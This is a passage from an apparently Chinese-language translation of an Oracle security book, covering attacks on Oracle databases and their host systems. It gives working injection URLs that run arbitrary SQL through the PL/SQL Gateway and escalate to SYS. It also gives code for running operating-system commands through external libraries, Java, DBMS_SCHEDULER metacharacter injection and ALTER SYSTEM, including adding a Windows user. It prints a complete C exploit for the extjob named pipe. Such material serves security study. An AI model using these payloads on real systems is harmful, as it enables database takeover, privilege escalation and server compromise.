((owa_match.match_pattern(&#x27;inject&#x27;point&#x27;, simple_list__,</span><br><span class="line">complex_list__, true))) then</span><br><span class="line">20   rc__ := 2;</span><br><span class="line">21  else</span><br><span class="line"></span><br><span class="line">22   null;</span><br><span class="line">23   orasso.wpg_session.init();</span><br><span class="line">24   inject&#x27;point;</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p>错误日志中生成错误：“PLS-00103：在期望以下其中一项时遇到符号‘POINT’……”这是由于 SQL 注入问题。 为了破坏服务器，攻击者只需要构建和注入特定的查询。有一些障碍需要克服。 首先，它们被限制为由句点分隔的三个 30 个字符的块 - 如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure><p>其次，它们注入的任何内容也都可以在第 24 行找到 - 由于它们必须用单引号引起来，因此该行上的 SQL 将不平衡。 他们可以通过将注入字符串的前两个字节设为双减来解决此问题。如果他们现在要求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;</span><br><span class="line"></span><br><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;&#x27;, simple_list__, complex_list__,</span><br><span class="line">true))) then</span><br></pre></td></tr></table></figure><p>现在需要闭合括号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))</span><br></pre></td></tr></table></figure><p>第19行代码变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;)))&#x27;, simple_list__,</span><br><span class="line">complex_list__,true))) then</span><br></pre></td></tr></table></figure><p>第24行为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x27;)));</span><br></pre></td></tr></table></figure><p>完成后，他们用 THEN 结束 IF：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))%20then%20rc__:%3D2</span><br></pre></td></tr></table></figure><p>第19行代码变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;))) then rc__:=2&#x27;, simple_list__,</span><br><span class="line">complex_list__, true))) then</span><br></pre></td></tr></table></figure><p>第24行为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x27;))) then rc__:=2;</span><br></pre></td></tr></table></figure><p>现在可以用分号和另一个双减号结束：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))%20then%20rc__:%3D2;--</span><br></pre></td></tr></table></figure><p>第19行代码变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;))) then rc__:=2;--&#x27;,</span><br><span class="line">simple_list__,complex_list__, true))) then</span><br></pre></td></tr></table></figure><p>第24行为 </p><p>–’))) then rc__:=2;–;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))</span><br></pre></td></tr></table></figure><p>这将返回一个“403 Forbidden”响应——这正是现阶段所期望的。 它返回禁止，因为 OWA_MATCH 将返回 true，因为注入字符串以双减号开头。 然而，这无关紧要，因为攻击者可以在最后一个分号和最后一个双减号之间注入一个过程，确保他们以分号结束他们的注入过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))%20then%20rc__:%3D2;XXXXXXXX;--</span><br></pre></td></tr></table></figure><p>通过在 XXXXXXXX 所在的位置放置任意 SQL，攻击者可以使其执行。 由于前面提到的限制，攻击可能被证明是困难的（但并非不可能），并且存在一种更简单的方法。</p><p>首先，攻击者需要找到一个不带参数的PL/SQL过程，如下例所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JAVA_AUTONOMOUS_TRANSACTION.PUSH</span><br><span class="line">XMLGEN.USELOWERCASETAGNAMES</span><br><span class="line">PORTAL.WWV_HTP.CENTERCLOSE</span><br><span class="line">ORASSO.HOME</span><br><span class="line">WWC_VERSION.GET_HTTP_DATABASE_INFO</span><br></pre></td></tr></table></figure><p>如果攻击者发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?FOO=BAR</span><br></pre></td></tr></table></figure><p>服务器应该返回“404 File Not Found”响应，因为 orasso.home 过程不需要参数并且已经提供了参数。 但是，在返回404之前，执行了以下PL/SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">..</span><br><span class="line">if ((owa_match.match_pattern(&#x27;orasso.home&#x27;, simple_list__,</span><br><span class="line">complex_list__,</span><br><span class="line">true))) then</span><br><span class="line"> rc__ := 2;</span><br><span class="line">else</span><br><span class="line"> null;</span><br><span class="line"> orasso.wpg_session.init();</span><br><span class="line"> orasso.home(FOO=&gt;:FOO);</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p>请注意攻击者的查询字符串中是否存在 FOO。 他们可以滥用它来运行任意 SQL。 首先，他们需要关闭括号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);--=BAR</span><br></pre></td></tr></table></figure><p>这将导致执行以下 PL/SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orasso.home();--=&gt;:);--);</span><br></pre></td></tr></table></figure><p>请注意，双减号 (–) 之后的所有内容都被视为注释。</p><p>此请求将导致内部服务器错误，因为不再使用绑定变量之一，因此攻击者需要将其添加回来。 碰巧，正是这个绑定变量是运行任意 PL/SQL 的关键。</p><p>目前，他们可以使用 HTP.PRINT 打印 BAR，并将所需的绑定变量添加为：1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR</span><br></pre></td></tr></table></figure><p>这应该在 HTML 中返回一个带有“BAR”字样的 200。 这里发生的事情是等号之后的所有内容（在本例中为 BAR）都是插入到绑定变量中的数据。</p><p>使用相同的技术还可以再次访问 owa_util：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS</span><br></pre></td></tr></table></figure><p>为了执行任意 SQL，包括 DML 和 DDL 语句，攻击者插入立即执行：1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual</span><br></pre></td></tr></table></figure><p>请注意，不会显示输出。 这可以用来利用 SYS 拥有的任何 PL/SQL 注入错误，从而使攻击者能够完全控制后端数据库服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1</span><br><span class="line">;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20</span><br><span class="line">BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES</span><br><span class="line">(&#x27;INDEX_NAME&#x27;,&#x27;INDEX_SCHEMA&#x27;,&#x27;DBMS_OUTPUT.PUT_LINE(:p1);</span><br><span class="line">EXECUTE%20IMMEDIATE%20&#x27;&#x27;CREATE%20OR%20REPLACE%20PUBLIC%20SYNONYM%20BREAK</span><br><span class="line">ABLE%20FOR%20SYS.BREAKABLE&#x27;&#x27;;END;--&#x27;,&#x27;SYS&#x27;,1,&#x27;VER&#x27;,0);END;</span><br></pre></td></tr></table></figure><p>截至 2005 年 11 月 25 日，此漏洞仍未修补且可利用。 假设这将在下一个重要补丁更新中修补：</p><ul><li><a href="http://www.oracle.com/technology/deploy/security/alerts.htm">http://www.oracle.com/technology/deploy/security/alerts.htm</a> </li></ul><p>当然，可能没有必要绕过 PL/SQL 排除列表。 例如，在 Oracle 9x 数据库服务器中，CTXSYS 用户是 DBA，CTXSYS 拥有的许多 PL/SQL 包都容易受到 SQL 注入的影响——例如 DRILOAD 包。 这个包有一个过程——即 VALIDATE_STMT——它基本上接受用户提供的查询并执行它。 这可能会在网络上被滥用。 这里要注意的一件事是非选择 SQL 请求可能看起来不起作用。 这是因为当您调用 VALIDATE_STMT 过程时，如果您没有进行选择，该过程将返回以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ERROR at line 1:</span><br><span class="line">ORA-06510: PL/SQL: unhandled user-defined exception</span><br><span class="line">ORA-06512: at &quot;CTXSYS.DRILOAD&quot;, line 42</span><br><span class="line">ORA-01003: no statement parsed</span><br><span class="line">ORA-06512: at line 1</span><br></pre></td></tr></table></figure><p>这将发送回 Web 服务器，因此 Web 服务器返回“404 文件未找到”响应。 测试是否可以获得访问权限，请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/CTXSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL</span><br></pre></td></tr></table></figure><p>应该返回一个带有 200 响应的空 HTML 页面。 如果是这样，那么以下内容也应该有效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=CREATE+OR+REPLACE+PROCEDURE+WEBTEST+AS+BEGIN+HTP.PRINT(&#x27;hello&#x27;);+END;</span><br></pre></td></tr></table></figure><p>这应该返回 404，但它会在 CTXSYS 模式中创建一个名为 WEBTEST 的包。</p><p>请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+EXECUTE+ON+WEBTEST+TO+PUBLIC</span><br></pre></td></tr></table></figure><p>授予 PUBLIC 对 WEBTEST 过程的执行权限，并请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad//ctxsys.webtest</span><br></pre></td></tr></table></figure><p>返回“Hello”。 这里发生了什么？ 我们的第一个请求创建了一个名为 WEBTEST 的过程，它使用 HTP.PRINT 写出“hello”。 此过程由 CTXSYS 创建并拥有。 第二个请求授予 PUBLIC 对 WEBTEST 过程的执行权限。 最后，我们可以称之为——最后一个请求。 从中可以看出整个攻击和漏洞的危险程度。</p><h2 id="执行操作系统命令"><a href="#执行操作系统命令" class="headerlink" title="执行操作系统命令"></a>执行操作系统命令</h2><p>Oracle 提供了许多用于从数据库服务器运行操作系统命令的工具——有些是故意的，有些是“黑客”。 命令可以通过 PL/SQL、Java 和默认包执行，并通过使用 ALTER SYSTEM 命令操作服务器参数来执行。 不用说，运行操作系统命令需要相关的高级权限，但前面的章节已经表明，获得这样的权限并不是一件困难的事。</p><h3 id="通过PL-SQL运行系统命令"><a href="#通过PL-SQL运行系统命令" class="headerlink" title="通过PL/SQL运行系统命令"></a>通过PL/SQL运行系统命令</h3><p>开发人员可以通过创建一个共享对象（动态链接库， DLL）来扩展 PL/SQL，该对象在函数中包含他们想要实现的代码。 开发人员将使用 CREATE LIBRARY 语句向 Oracle 服务器注册该库。 一旦注册，就可以调用该函数。 攻击者可以利用这种行为来运行操作系统命令。 他们会通过在 Unix 系统上注册 libc 或在 Windows 系统上注册 msvcrt.dll 然后调用 system() 函数来做到这一点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/ * First register msvcrt.dll/libc */</span><br><span class="line">CREATE OR REPLACE LIBRARY exec_shell AS &#x27;C:\winnt\system32\msvcrt.dll&#x27;;</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">/* Now create the procedure */</span><br><span class="line">CREATE OR REPLACE PROCEDURE oraexec (cmdstring IN CHAR)</span><br><span class="line">IS EXTERNAL</span><br><span class="line">NAME &quot;system&quot;</span><br><span class="line">LIBRARY exec_shell</span><br><span class="line">LANGUAGE C;</span><br><span class="line">/</span><br><span class="line">/* Once created now run commands */</span><br><span class="line">EXEC ORAEXEC(&#x27;NET USER MYACCOUNT PASSWORD /ADD&#x27;);</span><br></pre></td></tr></table></figure><p>当执行ORAEXEC 过程时，Oracle 连接到TNS Listener 并请求访问EXTPROC。 EXTPROC 是 Oracle 用于运行外部过程的程序。侦听器执行 EXTPROC，然后将命名管道上的连接传递给数据库服务器。然后，数据库服务器指示 EXTPROC 加载 msvcrt.dll 库并执行 system() 函数，将命令“NET USER MYACCOUNT PASSWORD /ADD”传递给它。这告诉操作系统添加一个名为 MYACCOUNT 的新用户。因为默认情况下 Oracle 在 Windows 上作为 LOCAL SYSTEM 运行，所以执行起来应该没有任何问题。然后，攻击者当然可以将 MYACCOUNT 添加到本地管理员组。 Oracle 的许多安全安装将禁用外部程序；对于那些需要启用外部程序的程序，它们已被配置为以低权限用户身份运行。</p><p>更高版本的 Oracle 将外部库的位置限制在 ORACLE_HOME\bin 目录中。然而，这可以通过使用目录遍历攻击来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE LIBRARY exec_shell AS</span><br><span class="line">&#x27;$ORACLE_HOME\bin\..\..\..\..\..\winnt\system32\msvcrt.dll&#x27;;</span><br><span class="line"></span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>Oracle 已经修复了这个缺陷，因此有两种使用 PL/SQL 执行 OS 命令的方法。 首先，可以使用 UTL_FILE 包（参见第 11 章“访问文件系统”）将 DLL 放入 ORACLE_HOME/bin 目录，或者设置 EXTPROC_DLLS 环境变量。 在无法运行 OS 命令的情况下，第二种方法更难在 Oracle 内部执行，因此首选前一种方法。</p><h3 id="通过Java运行操作系统命令"><a href="#通过Java运行操作系统命令" class="headerlink" title="通过Java运行操作系统命令"></a>通过Java运行操作系统命令</h3><p>通过 Java 运行 OS 命令不依赖于外部过程，命令以 Oracle 用户的权限执行。 一旦创建了 Java 源代码，它就会被包装在一个 PL/SQL 过程中，然后可以执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVACMD&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVACMD</span><br><span class="line">&#123;</span><br><span class="line"> public static void execCommand (String command) throws IOException</span><br><span class="line"> &#123;</span><br><span class="line">     Runtime.getRuntime().exec(command);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVACMDPROC (p_command IN VARCHAR2)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVACMD.execCommand (java.lang.String)&#x27;;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">exec javacmdproc(&#x27;cmd.exe /c dir &gt; c:\orajava.txt&#x27;);</span><br></pre></td></tr></table></figure><p>执行 OS 命令所需的 Java 权限如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission(  &#x27;SCOTT&#x27;, &#x27;SYS:java.io.FilePermission&#x27;,&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;,&#x27;execute&#x27;);</span><br><span class="line">exec dbms_java.grant_permission(  &#x27;SCOTT&#x27;,&#x27;SYS:java.lang.RuntimePermission&#x27;, &#x27;writeFileDescriptor&#x27;, &#x27;&#x27;);</span><br><span class="line">exec dbms_java.grant_permission(  &#x27;SCOTT&#x27;,&#x27;SYS:java.lang.RuntimePermission&#x27;, &#x27;readFileDescriptor&#x27;, &#x27;&#x27;);</span><br></pre></td></tr></table></figure><h3 id="通过DBMS-SCHEDULER运行系统命令"><a href="#通过DBMS-SCHEDULER运行系统命令" class="headerlink" title="通过DBMS_SCHEDULER运行系统命令"></a>通过DBMS_SCHEDULER运行系统命令</h3><p>DBMS_SCHEDULER 是 Oracle 10g 中引入并附带的 PL/SQL 包。 创建此包的目的是使 DBA 能够将预定义的包和 shell 脚本（例如 Windows 批处理文件和 Unix sh 文件）的执行安排为“作业”。 使用 DBMS_SCHEDULER 成功提交作业需要 CREATE JOB 权限。 不允许执行程序。 但是，存在一个允许绕过此限制的错误。 通过在要运行的程序的名称中嵌入诸如与号 (&amp;) 或管道 (∥) 之类的 shell 元字符，可以执行程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_PROGRAM (</span><br><span class="line">program_name=&gt; &#x27;MyCmd&#x27;,</span><br><span class="line">program_type=&gt; &#x27;EXECUTABLE&#x27;,</span><br><span class="line">-- Use the ampersand to break out</span><br><span class="line">program_action =&gt;</span><br><span class="line">&#x27;c:/foo.bat&#x27;||chr(38)||&#x27;dir&gt;c:/oraoutput.txt&#x27;||chr(38)||&#x27;c:/foo.bat&#x27;,</span><br><span class="line">enabled=&gt; TRUE,</span><br><span class="line">comments=&gt; &#x27;Run a command using shell metacharacters.&#x27;</span><br><span class="line"> );</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_JOB (</span><br><span class="line">   job_name=&gt; &#x27;X&#x27;,</span><br><span class="line">   program_name=&gt; &#x27;MyCmd&#x27;,</span><br><span class="line">   repeat_interval=&gt; &#x27;FREQ=SECONDLY;INTERVAL=10&#x27;,</span><br><span class="line">   enabled=&gt; TRUE,</span><br><span class="line">   comments=&gt; &#x27;Every 10 seconds&#x27;);</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>如果要通过 DBMS_SCHEDULER 运行 OS 命令，则必须运行 OracleJobSchedulerSID 服务。 如果没有，则调度程序将生成错误。</p><h3 id="通过Job-Scheduler运行系统命令"><a href="#通过Job-Scheduler运行系统命令" class="headerlink" title="通过Job Scheduler运行系统命令"></a>通过Job Scheduler运行系统命令</h3><p>作业调度程序作为外部进程实现 - extjob。 在 Windows 上，它以 LOCAL SYSTEM 操作系统帐户的权限运行。 它侦听名为“orcljsex<SID>”的命名管道，其中 SID 是数据库系统标识符。 当 Job Scheduler 在这个命名管道上接收到一个命令时，它只是尝试执行它。 因此，任何可以连接到命名管道的人，无论是在本地还是使用 SMB 跨网络，都可以作为 LOCAL SYSTEM 运行命令并完全破坏服务器：</SID></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">/* Oracle External Job Remote Command Exploit</span><br><span class="line">Oracle&#x27;s extjob.exe listens on a named pipe &quot;orcljsex&lt;SID&gt; and executes</span><br><span class="line">commands</span><br><span class="line">sent through it.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line"> char buffer[540]=&quot;&quot;;</span><br><span class="line"> char NamedPipe[260]=&quot;\\\\&quot;;</span><br><span class="line"> HANDLE rcmd=NULL;</span><br><span class="line"> char *ptr = NULL;</span><br><span class="line"> int len =0;</span><br><span class="line"> DWORD Bytes = 0;</span><br><span class="line"></span><br><span class="line"> if(argc !=4)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;\n\tOracle External Job Remote Command Exploit.\n\n&quot;);</span><br><span class="line">  printf(&quot;\tUsage: oraextjob target SID \&quot; command\&quot;\n&quot;);</span><br><span class="line">  printf(&quot;\n\tDavid Litchfield\n\t(david@ngssoftware.com)\n\t1st October</span><br><span class="line">2006\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> strncat(NamedPipe,argv[1],100);</span><br><span class="line"> strcat(NamedPipe,&quot;\\pipe\\orcljsex&quot;);</span><br><span class="line"> len = strlen(NamedPipe);</span><br><span class="line"> if(len&gt;256)</span><br><span class="line">                                          return printf(&quot;Too long...\n&quot;);</span><br><span class="line"> len = 256 - len;</span><br><span class="line">// tack on the SID</span><br><span class="line"> strncat(NamedPipe,argv[2],len);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> // Open the named pipe</span><br><span class="line"> rcmd =</span><br><span class="line">CreateFile(NamedPipe,GENERIC_WRITE|GENERIC_READ,0,NULL,OPEN_EXISTING,0,N</span><br><span class="line">ULL);</span><br><span class="line"> if(rcmd == INVALID_HANDLE_VALUE)</span><br><span class="line">  return printf(&quot;Failed to open pipe %s. Error</span><br><span class="line">%d.\n&quot;,NamedPipe,GetLastError());</span><br><span class="line"></span><br><span class="line"> // Send command</span><br><span class="line"> len = WriteFile(rcmd,argv[3],strlen(argv[3]),&amp;Bytes,NULL);</span><br><span class="line"></span><br><span class="line"> if(!len)</span><br><span class="line">  return printf(&quot;Failed to write to %s. Error</span><br><span class="line">%d.\n&quot;,NamedPipe,GetLastError());</span><br><span class="line"></span><br><span class="line"> // Read results</span><br><span class="line"> while(len)</span><br><span class="line"> &#123;</span><br><span class="line">  len = ReadFile(rcmd,buffer,530,&amp;Bytes,NULL);</span><br><span class="line">  printf(&quot;%s&quot;,buffer);</span><br><span class="line"></span><br><span class="line">  ZeroMemory(buffer,540);</span><br><span class="line"> &#125;</span><br><span class="line">CloseHandle(rcmd);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过ALTER-SYSTEM运行系统命令"><a href="#通过ALTER-SYSTEM运行系统命令" class="headerlink" title="通过ALTER SYSTEM运行系统命令"></a>通过ALTER SYSTEM运行系统命令</h3><p>Oracle 从未打算将其作为运行命令的正确方法，但它运行良好。 在 Oracle 9i 中，可以操纵 Oracle 编译本机 PL/SQL 程序的方式。 这是通过提供 make 程序的名称来完成的。 显然，这可以被滥用来运行操作系统命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ALTER SYSTEM SET plsql_native_make_utility = &#x27;cmd.exe /C dir &gt;</span><br><span class="line">c:\ooops.txt &amp;&#x27;;</span><br><span class="line">ALTER SYSTEM SET plsql_native_make_file_name = &#x27; foo&#x27;;</span><br><span class="line">ALTER SYSTEM SET plsql_native_library_dir=&#x27;bar&#x27;;</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PROCEDURE ohoh AS</span><br><span class="line">BEGIN</span><br><span class="line">NULL;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">show errors</span><br></pre></td></tr></table></figure><p>当 Oracle 编译 ohoh 过程时，Oracle 执行以下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /C dir &gt; c:\ooops.txt &amp; -f foo bar/RUN_CMD__SYSTEM__0.DLL</span><br></pre></td></tr></table></figure><p>Oracle 10g 弃用了 plsql_native_make_utility 参数。</p><h2 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h2><p>一旦服务器遭到入侵，攻击者可能想要探索文件系统——事实上，大量 Oracle 文件包含用户 ID 和密码，因此攻击者可能能够提升权限，如果他们还没有这样做的话。 可以使用 PL/SQL 或 Java 来访问文件系统。 由于对文件系统的访问是通过用于运行服务器的帐户的权限实现的，因此攻击者可以获得对数据库数据文件的直接原始访问。 因此，可以完全绕过所有数据库强制访问控制。 您已经在第 8 章“击败虚拟专用数据库”中看到了这一点。</p><h3 id="使用UTL-FILE-包访问文件系统"><a href="#使用UTL-FILE-包访问文件系统" class="headerlink" title="使用UTL_FILE 包访问文件系统"></a>使用UTL_FILE 包访问文件系统</h3><p>UTL_FILE 包使 Oracle 用户能够读取和写入文件系统。 如前所述，对文件系统上的文件的访问是通过 Oracle 用户的权限实现的 - 因此该用户可以读取或写入的任何内容都可以被其他任何人读取或写入。 以下 PL/SQL 代码可用于从文件系统读取文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 